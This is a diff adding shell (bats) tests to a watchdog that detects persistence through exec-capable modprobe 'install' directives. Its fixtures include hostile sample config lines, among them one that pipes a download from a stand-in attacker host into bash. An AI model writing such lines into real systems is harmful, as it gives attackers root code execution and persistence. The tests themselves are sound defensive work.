@@ -226,3 +226,45 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     main_count=$(cap | grep -cE '^-t selfdef-modprobe-config -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no auto-trust): modprobe-config-watchdog does NOT refresh baseline on exec-capable-install detection — alert STAYS until operator updates" {
+    # Module-autoload-trigger root-exec persistence — alert MUST persist
+    # across runs until operator explicitly re-baselines.
+    printf 'install pcspkr /bin/true\n' > "${CONF}"
+    run_wd
+    printf 'install evilmod /tmp/payload\n' > "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (commented exec-install NOT flagged: # prefix filtered)" {
+    printf 'install pcspkr /bin/true\n' > "${CONF}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'install pcspkr /bin/true\n# install evilmod /tmp/example-attacker\n' > "${CONF}"
+    run_wd
+    ! cap | grep -q '"event":"modprobe_config_exec_install"'
+    ! cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (/bin/false is also a benign disable variant — sister to /bin/true)" {
+    # The disable idiom can use /bin/true OR /bin/false; both are no-op
+    # successes/failures that intentionally block module load. Lock that
+    # /bin/false is also NOT flagged as exec-capable.
+    printf 'install pcspkr /bin/true\ninstall usb_storage /bin/false\n' > "${CONF}"
+    run_wd
+    ! cap | grep -q '"severity":"alert"'
+    cap | grep -q '"severity":"ok"'
+}
+
+@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected in install)" {
+    printf 'install pcspkr /bin/true\n' > "${CONF}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'install evilmod /bin/sh -c "curl -s http://attacker.com/p | bash"\n' > "${CONF}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
